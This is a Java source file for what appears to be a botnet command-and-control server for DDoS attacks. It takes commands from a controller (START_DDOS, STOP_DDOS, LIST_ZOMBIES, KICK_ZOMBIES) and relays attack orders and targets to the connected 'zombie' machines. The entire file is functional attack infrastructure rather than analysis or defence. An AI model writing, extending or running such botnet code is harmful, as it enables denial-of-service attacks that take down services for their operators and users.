package org.ddos.server;

import java.io.EOFException;
import java.io.Serializable;
import java.io.StreamCorruptedException;
import java.net.SocketAddress;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Date;

import org.jnetwork.DataPackage;
import org.jnetwork.Server;
import org.jnetwork.SocketPackage;
import org.jnetwork.listener.ClientConnectionListener;
import org.jnetwork.listener.ClientDisconnectionListener;

public class DDOSServer implements ClientConnectionListener, ClientDisconnectionListener {
	private static final long serialVersionUID = -4786497469961089553L;

	private Server server;

	public Server getServer() {
		return server;
	}

	public void setServer(Server server) {
		this.server = server;
	}

	@Override
	public void clientConnected(SocketPackage event) {
		System.out.println(event.getConnection().getRemoteSocketAddress() + " connected.");
		try {
			DataPackage initialPackage = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
			boolean isClient = !(boolean) initialPackage.getObjects()[0];

			server.setConnectionData(event, !isClient, null);

			if (isClient) {
				while (!event.getConnection().isClosed()) {
					DataPackage pkgIn = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
					System.out.println("Package received: " + pkgIn.getMessage() + " (ID: " + pkgIn.getId() + ")");
					if (pkgIn.getMessage().equals("START_DDOS")) {
						for (SocketPackage zombie : server.getClients()) {
							if ((boolean) zombie.getExtraData()[0]) {
								if (zombie.getExtraData()[1] != null) {
									zombie.getOutputStream().writeObject(new DataPackage().setMessage("STOP_DDOS"));
								}
								zombie.getOutputStream().writeObject(pkgIn);
								server.setConnectionData(zombie, true, pkgIn.getObjects()[0]);
							}
						}
					} else if (pkgIn.getMessage().equals("STOP_DDOS")) {
						for (SocketPackage zombie : server.getClientsByData(true, pkgIn.getObjects()[0])) {
							zombie.getOutputStream().writeObject(pkgIn);
							server.setConnectionData(zombie, true, null);
						}
					} else if (pkgIn.getMessage().equals("KICK_ZOMBIES")) {
						for (SocketAddress zombie : (SocketAddress[]) pkgIn.getObjects()) {
							server.removeClient(zombie);
						}
					} else if (pkgIn.getMessage().equals("LIST_ZOMBIES")) {
						ArrayList<SocketAddress> addrs = new ArrayList<>();
						for (SocketPackage connected : server.getClients())
							if ((boolean) connected.getExtraData()[0])
								addrs.add(connected.getConnection().getRemoteSocketAddress());

						event.getOutputStream().writeObject(
								new DataPackage((Serializable[]) addrs.toArray(new SocketAddress[addrs.size()]))
										.setMessage("ZOMBIES_LIST"));
					} else if (pkgIn.getMessage().equals("KICK_ALL_ZOMBIES")) {
						SocketPackage[] zombies = server.getClientsByData(true);
						for (SocketPackage zombie : zombies) {
							server.removeClient(zombie);
						}
					}
				}
			} else {
				Object waiter = new Object();
				synchronized (waiter) {
					waiter.wait();
				}
			}
		} catch (StreamCorruptedException e) {
			System.err.println(new Date() + " " + event.getConnection().getRemoteSocketAddress() + " STREAM CORRUPTED: "
					+ e.getMessage());
		} catch (SocketException | EOFException e) {
			return;
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
	}

	@Override
	public void clientDisconnected(SocketPackage event) {
		System.out.println(event.getConnection().getRemoteSocketAddress() + " disconnected.");
	}
}